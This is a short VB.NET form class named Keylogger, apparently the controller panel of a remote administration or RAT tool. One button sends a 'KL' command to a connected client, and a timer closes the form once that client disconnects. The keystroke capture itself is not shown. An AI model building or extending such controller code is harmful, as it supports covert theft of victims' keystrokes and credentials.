Public Class Keylogger
    Public M As Main
    Public U As USER

    Private Sub MetroButton1_Click(sender As Object, e As EventArgs) Handles MetroButton1.Click
        M.S.Send(U, "KL")
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If U.IsConnected = False Then
            Me.Close()
        End If
    End Sub
End Class